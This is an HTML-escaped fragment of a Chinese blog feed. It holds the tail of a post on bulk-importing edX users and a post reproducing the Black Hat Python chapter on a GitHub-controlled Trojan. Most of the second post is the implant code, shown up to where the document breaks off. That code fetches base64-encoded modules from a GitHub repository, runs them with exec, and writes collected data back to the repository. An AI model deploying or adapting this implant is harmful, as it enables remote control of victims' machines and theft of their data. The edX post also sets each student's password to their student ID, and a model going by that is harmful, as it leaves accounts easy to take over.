        &lt;span class="p"&gt;)&lt;/span&gt;

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;handle&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="n"&gt;options&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="n"&gt;csv&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;options&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;csv&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
        &lt;span class="k"&gt;with&lt;/span&gt; &lt;span class="nb"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;csv&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;as&lt;/span&gt; &lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="n"&gt;f_csv&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;unicodecsv&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;DictReader&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;encoding&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;utf-8&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
            &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;item&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;f_csv&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
                &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="n"&gt;item&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;u&amp;quot;姓名&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
                &lt;span class="n"&gt;username&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;item&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;u&amp;quot;学号&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
                &lt;span class="n"&gt;email&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;item&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;u&amp;quot;email&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
                &lt;span class="n"&gt;name&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;item&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;u&amp;quot;姓名&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
                &lt;span class="n"&gt;password&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;username&lt;/span&gt;
                &lt;span class="n"&gt;create_user&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;username&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;email&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="c1"&gt;# 缺乏读写csv的技巧,next和边界，按header读取&lt;/span&gt;
        &lt;span class="c1"&gt;# http://python3-cookbook.readthedocs.io/zh_CN/latest/c06/p01_read_write_csv_data.html&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;测试显示，8000名学生的话，大约需要导入十几分钟(旧版本)&lt;/p&gt;
&lt;h3&gt;安装依赖&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;sudo /edx/bin/pip.edxapp install unicodecsv #dogwood版不需要
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;开始导入&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;sudo -u www-data /edx/bin/python.edxapp /edx/app/edxapp/edx-platform/manage.py lms create_user_from_csv --csv /tmp/student.csv --settings devstack&lt;/code&gt;&lt;/p&gt;
&lt;h3&gt;开始使用&lt;/h3&gt;
&lt;p&gt;在/login中使用email和password登录即可。&lt;/p&gt;
&lt;p&gt;对于不想使用这种登录方式的，可以自己来写用户认证，诸如使用username和password登录之类的&lt;/p&gt;
&lt;h3&gt;后记&lt;/h3&gt;
&lt;p&gt;文中我们创建用户使用的是python代码。&lt;/p&gt;
&lt;p&gt;如果是单独创建用户，也可以用&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;sudo -u www-data /edx/bin/python.edxapp /edx/app/edxapp/edx-platform/manage.py lms  create_user --username test123 --name test123  --password test123 --email test123@qq.com 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;如果你愿意也可以采用http请求创建，详情可以跟踪sysadmin里的创建用户功能（封装成restful接口可用作异构系统接口）&lt;/p&gt;
&lt;h1&gt;坑&lt;/h1&gt;
&lt;p&gt;删除用户之后创建同名用户，会造成:CommentClientRequestError: u'["Username is already taken"]',猜测是评论系统内依然留存有用户造成的,而评论系统是个异构系统(mongodb)&lt;/p&gt;
&lt;p&gt;线索：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;import lms.lib.comment_client as cc&lt;/li&gt;
&lt;li&gt;cc_user = cc.User.from_django_user(user)&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;解决方案&lt;/h3&gt;
&lt;p&gt;如果我们的猜测是对的，应该只要删除点mongodb中的user应该就好了&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;mongo
use cs_comments_service_development
db.users.find()
db.users.remove({}) #移除所有,也可以写到python脚本里,使用pymongo
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;一切正常，猜测正确!&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Wed, 13 Jul 2016 00:00:00 +0000</pubDate><guid>tag:,2016-07-13:edx-user-import.html</guid><category>edx</category></item><item><title>用python和github构建一只玩具木马</title><link>/use-python-and-github-create-Trojan-Horse.html</link><description>&lt;p&gt;周末在新街口大众书局看到 《Black Hat Python》(《python黑帽子 --黑客与渗透测试编程之道》),饶有兴致地翻了翻, 觉得第七章很有意思，分享过来&lt;/p&gt;
&lt;p&gt;作者在这一章里说道&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;One of the most challenging aspects of creating a solid trojan framework is asynchronously controlling, updating, and receiving data from your deployed implants. It’s crucial to have a relatively universal way to push code to your remote trojans&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;写一个特洛伊木马的的挑战之一是异步地控制、更新和接收数据，并且能够通用的方法给你的木马们远程推送指令，而作者试图在这一章中给出一个漂亮的解决方案&lt;/p&gt;
&lt;h1&gt;木马&lt;/h1&gt;
&lt;p&gt;上边说的的木马是什么鬼&lt;/p&gt;
&lt;p&gt;据维基百科说 , "木马"这一名称来源于希腊神话特洛伊战争的特洛伊木马。攻城的希腊联军佯装撤退后留下一只木马，特洛伊人将其当作战利品带回城内。当特洛伊人为胜利而庆祝时，从木马中出来了一队希腊兵，它们悄悄打开城门，放进了城外的军队，最终攻克了特洛伊城。计算机中所说的木马与病毒一样也是一种有害的程序，其特征与特洛伊木马一样具有伪装性，看起来挺好的，却会在用户不经意间，对用户的计算机系统产生破坏或窃取数据，特别是用户的各种账户及口令等重要且需要保密的信息，甚至控制用户的计算机系统。&lt;/p&gt;
&lt;p&gt;经过一番追本溯源，计算机中这种被称为木马的程序有哪些特性，大家大体上应该有个印象了，如果不用隐喻，要描述出这类程序的特质，恐怕要多费许多口舌&lt;/p&gt;
&lt;p&gt;计算机科学的趣味之一是它的词汇异常丰富和生动，有大量的隐喻和类比&lt;/p&gt;
&lt;p&gt;《代码大全》在开篇的不久说道：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;计算机科学领域中有着搜友学科中最为丰富多彩的语言。你走进一间安全严密，温度精确控制在20℃的房间，并在里面发现了病毒（virus），特洛伊木马（Trojan horse），蠕虫（worm），臭虫（bug），逻辑炸弹（bomb），崩溃（crash），论坛口水战（flame），双绞线转换头（twisted sex changer），还有致命错误（fatal error）……在其他领域中，你能遇到这些吗？&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1&gt;正餐&lt;/h1&gt;
&lt;p&gt;在着一章中，作者主要演示了如何利用github作为控制和数据中心，构建灵活的木马，至于你要用木马来做什么，你可以发挥想象自己写插件到module里&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;talk is cheap,show me your code&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;代码不长，直接贴上(大家可以直接看&lt;a href="https://github.com/wwj718/blackhatpythonbook"&gt;源码库&lt;/a&gt;)，值得说明的地方稍后讲解&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;json&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;base64&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;sys&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;time&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;imp&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;random&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;threading&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;Queue&lt;/span&gt;
&lt;span class="c1"&gt;#import os&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;yaml&lt;/span&gt;

&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;github3&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;login&lt;/span&gt;

&lt;span class="n"&gt;trojan_id&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;abc&amp;quot;&lt;/span&gt;

&lt;span class="n"&gt;trojan_config&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s2"&gt;.json&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="n"&gt;trojan_id&lt;/span&gt;
&lt;span class="n"&gt;data_path&lt;/span&gt;     &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;data/&lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s2"&gt;/&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="n"&gt;trojan_id&lt;/span&gt;
&lt;span class="n"&gt;trojan_modules&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[]&lt;/span&gt;

&lt;span class="n"&gt;task_queue&lt;/span&gt;    &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Queue&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Queue&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;span class="n"&gt;configured&lt;/span&gt;    &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="bp"&gt;False&lt;/span&gt;


&lt;span class="k"&gt;with&lt;/span&gt; &lt;span class="nb"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;./local.yaml&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;r&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;as&lt;/span&gt; &lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="n"&gt;config&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;yaml&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;load&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="n"&gt;username&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;config&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;username&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;span class="n"&gt;password&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;config&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;password&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;


&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;GitImporter&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;object&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;__init__&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;current_module_code&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;


    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;find_module&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;fullname&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;None&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;

        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;configured&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;[*] Attempting to retrieve &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="n"&gt;fullname&lt;/span&gt;
            &lt;span class="n"&gt;new_library&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;get_file_contents&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;modules/&lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="n"&gt;fullname&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

            &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;new_library&lt;/span&gt; &lt;span class="ow"&gt;is&lt;/span&gt; &lt;span class="ow"&gt;not&lt;/span&gt; &lt;span class="bp"&gt;None&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
                &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;current_module_code&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;base64&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;b64decode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;new_library&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
                &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;


        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="bp"&gt;None&lt;/span&gt;

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;load_module&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;

        &lt;span class="n"&gt;module&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;imp&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;new_module&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

        &lt;span class="k"&gt;exec&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;current_module_code&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;module&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;__dict__&lt;/span&gt;

        &lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;modules&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;module&lt;/span&gt;

        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;module&lt;/span&gt;



&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;connect_to_github&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
    &lt;span class="n"&gt;gh&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;login&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;username&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;username&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;repo&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;gh&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;repository&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;username&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;blackhatpythonbook&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;branch&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;repo&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;branch&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;master&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;gh&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;repo&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;branch&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;get_file_contents&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;filepath&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;

    &lt;span class="n"&gt;gh&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;repo&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;branch&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;connect_to_github&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;

    &lt;span class="n"&gt;tree&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;branch&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;commit&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;commit&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;tree&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;recurse&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;

    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;filename&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;tree&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;tree&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;

        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;filepath&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;filename&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;[*] Found file &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="n"&gt;filepath&lt;/span&gt;

            &lt;span class="n"&gt;blob&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;repo&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;blob&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;filename&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;_json_data&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;sha&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;

            &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;blob&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;content&lt;/span&gt;

    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="bp"&gt;None&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;get_trojan_config&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
    &lt;span class="k"&gt;global&lt;/span&gt; &lt;span class="n"&gt;configured&lt;/span&gt;

    &lt;span class="n"&gt;config_json&lt;/span&gt;   &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;get_file_contents&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;trojan_config&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;config&lt;/span&gt;        &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;json&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;loads&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;base64&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;b64decode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;config_json&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
    &lt;span class="n"&gt;configured&lt;/span&gt;    &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="bp"&gt;True&lt;/span&gt;

    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;task&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;config&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;

        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;task&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;module&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="ow"&gt;not&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;modules&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;

            &lt;span class="k"&gt;exec&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;import &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="n"&gt;task&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;module&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;

    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;config&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;store_module_result&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;

    &lt;span class="n"&gt;gh&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;repo&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;branch&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;connect_to_github&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;

    &lt;span class="n"&gt;remote_path&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;data/&lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s2"&gt;/&lt;/span&gt;&lt;span class="si"&gt;%d&lt;/span&gt;&lt;span class="s2"&gt;.data&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;trojan_id&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;random&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;randint&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1000&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;100000&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;

    &lt;span class="n"&gt;repo&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;create_file&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;remote_path&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Commit message&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;base64&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;b64encode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;

    &lt;span class="k"&gt;return&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;module_runner&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;module&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
